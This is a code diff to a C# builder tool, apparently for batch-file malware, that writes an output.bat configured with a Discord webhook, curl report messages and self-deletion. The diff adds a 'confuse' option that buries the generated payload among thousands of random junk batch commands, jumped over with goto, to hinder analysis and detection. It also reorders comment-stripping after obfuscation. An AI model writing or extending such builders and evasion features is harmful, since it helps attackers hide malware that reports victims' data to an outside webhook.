@@ -46,6 +46,7 @@ namespace BSBuilder
         bool selfdelete = Properties.Settings.Default.selfdelete;
         bool optimize = Properties.Settings.Default.optimize;
         bool obfuscate = Properties.Settings.Default.obfuscate;
+        bool confuse = Properties.Settings.Default.confuse;
 
         string webhook = Properties.Settings.Default.webhook;
         string reportstartmsg = Properties.Settings.Default.reportstartmsg;
@@ -89,6 +90,7 @@ namespace BSBuilder
             selfdeletecheckbox.Checked = Properties.Settings.Default.selfdelete;
             optimizecheckbox.Checked = Properties.Settings.Default.optimize;
             obfuscatecheckbox.Checked = Properties.Settings.Default.obfuscate;
+            confusecheckbox.Checked = Properties.Settings.Default.confuse;
 
             webhooktextbox.Text = Properties.Settings.Default.webhook;
             reportstartmsgtextbox.Text = Properties.Settings.Default.reportstartmsg;
@@ -329,12 +331,6 @@ namespace BSBuilder
                     if (reportendmsg.Length != 0)
                         editCURL(curlmessage0 + "```Batch Scheduled: %recurring%\\n[End of report]```" + curlmessage1, reportendmsg);
 
-                    if (optimize)
-                    {
-                        batch = Regex.Replace(batch, @"^::.*", string.Empty, RegexOptions.Multiline);
-                        batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
-                    }
-
                     if (webhook.Length != 0)
                         editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);
 
@@ -365,6 +361,149 @@ namespace BSBuilder
                     if (obfuscate)
                         obfuscatebatch(batch, 1);
 
+                    if (optimize)
+                    {
+                        batch = Regex.Replace(batch, @"^::.*", string.Empty, RegexOptions.Multiline);
+                        batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
+                    }
+
+                    if (confuse)
+                    {
+                        Random rand = new Random();
+
+                        //Amount of lines
+                        int phase01random = rand.Next(100, 15000);
+                        int phase03random = rand.Next(100, 3500);
+
+                        string confusedbatch = "";
+
+                        string[] commands = {
+                            "IF %F%==1 IF %C%==1",
+                            "   ELSE IF %F%==1 IF %C%==0",
+                            "ELSE IF %F%==0 IF %C%==1",
+                            " ELSE IF %F%==0 IF %C%==1",
+                            "goto endoftests",
+                            "   goto workdone",
+                            "set F=%date%",
+                            ":: Fixed",
+                            "if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)",
+                            "   if %user_agrees% do",
+                            "set /p folder=Folder Address:" +
+                            "FOR /R %folder% %%G IN (.) DO (" +
+                            "   set filepath=%%~dpa" +
+                            "\n)" +
+                            "%time% & dir & echo %time%",
+                            "\npause" +
+                            "\n)",
+                            "   set filepath=%%~fG",
+                            "set filepath=%%~fG & set /p folder=Folder Address: & set F=%date% & for /f \"delims=[] tokens=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| findstr [') do set d=%%a",
+                            "   set for /f \"delims=[] tokens=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| findstr [') do set d=%%a & set F=%date%",
+                            "ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A sample =1",
+                            "   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.) & IF %F%==1 do %C%==1",
+                            "timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %) else (set r = success, % then %, false.) &IF % F %== 2 do % C %== 4",
+                            "   set C=cls",
+                            "   set /A sample =1",
+                            "   fc /l %comp1% %comp2%",
+                            "for /f \"delims=[] tokens=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| findstr [') do set d=%%a",
+                            "   timeout /t 2 /nobreak > NUL",
+                            "   if errorlevel 1 (@echo off) else",
+                            "whoami",
+                            "   if %ERRORLEVEL% EQU 1 goto w",
+                            "move \"%sourceFile%\" \"%destinationFile%\"",
+                            "   move \"%sourceFile%\" \"%destinationFile%\"",
+                            "cls",
+                            "",
+                            "",
+                            "",
+                            "",
+                            "",
+                            "",
+                            "",
+                            "",
+                            "",
+                            "",
+                            "if 0==1 0",
+                            "   if 0==1 0",
+                            "cd.",
+                            "call",
+                            "   call",
+                            "setlocal",
+                            "2>NUL Info > %tempsys%",
+                            "   2>NUL Info > %tempsys%"
+                        };
+
+                        string lastcommand = "";
+
+                        //PHASE 01 | ADD RANDOM GARBAGE COMMANDS TO THE START
+                        for (int i = 0; i <= phase01random; i++)
+                        {
+                            //First time
+                            if (i == 1)
+                            {
+                                confusedbatch = ":: Copyright © 200" + rand.Next(4, 9) + " - V" + rand.Next(1, 10) + "." + rand.Next(1, 42069) + "\n@echo off\ncd.\nif 0==1 0\ngoto tmp";
+                            }
+                            //Generally
+                            else
+                            {
+                                start:
+                                int a = rand.Next(0, commands.Length);
+
+                                if (commands[a] != lastcommand)
+                                {
+                                    confusedbatch = confusedbatch + Environment.NewLine;
+                                    confusedbatch = confusedbatch + commands[a];
+
+                                    if (i == phase01random)
+                                    {
+                                        confusedbatch = confusedbatch + Environment.NewLine;
+                                        confusedbatch = confusedbatch + ":tmp";
+                                    }
+                                }
+                                else goto start;
+
+                                lastcommand = commands[a];
+                            }
+                        }
+
+                        //PHASE 02 | ADD BATCH CONTENT
+                        confusedbatch = confusedbatch + "\n" + batch;
+
+                        //PHASE 03 | ADD RANDOM GARBAGE TO THE END
+
+                        for (int i = 0; i <= phase03random; i++)
+                        {
+                            //First time
+                            if (i == 1)
+                            {
+                                confusedbatch = confusedbatch + Environment.NewLine;
+                                confusedbatch = confusedbatch + "goto temp";
+                            }
+                            //Generally
+                            else
+                            {
+                                start:
+                                int a = rand.Next(0, commands.Length);
+
+                                if (commands[a] != lastcommand)
+                                {
+                                    confusedbatch = confusedbatch + Environment.NewLine;
+                                    confusedbatch = confusedbatch + commands[a];
+
+                                    if (i == phase03random)
+                                    {
+                                        confusedbatch = confusedbatch + Environment.NewLine;
+                                        confusedbatch = confusedbatch + ":temp\nexit";
+                                    }
+                                }
+                                else goto start;
+
+                                lastcommand = commands[a];
+                            }
+                        }
+
+                        batch = confusedbatch;
+                    }
+
                     using (StreamWriter wt = new StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "output.bat"))
                     {
                         wt.WriteLine(batch);
@@ -380,7 +519,6 @@ namespace BSBuilder
                     buildbutton.Text = "Restart the program";
 
                     Application.Restart();
-                    Environment.Exit(0);
                 }
                 else
                 {
@@ -742,6 +880,7 @@ namespace BSBuilder
             Properties.Settings.Default.selfdelete = selfdelete;
             Properties.Settings.Default.optimize = optimize;
             Properties.Settings.Default.obfuscate = obfuscate;
+            Properties.Settings.Default.confuse = confuse;
 
             Properties.Settings.Default.webhook = webhook;
             Properties.Settings.Default.reportstartmsg = reportstartmsg;
@@ -803,6 +942,18 @@ namespace BSBuilder
         private void fetchbutton_Click(object sender, EventArgs e)
         {
             fetchbatch();
+        }
+
+        private void confusecheckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            if (confusecheckbox.Checked)
+            {
+                confuse = true;
+            }
+            else
+            {
+                confuse = false;
+            }
         }
     }
 }
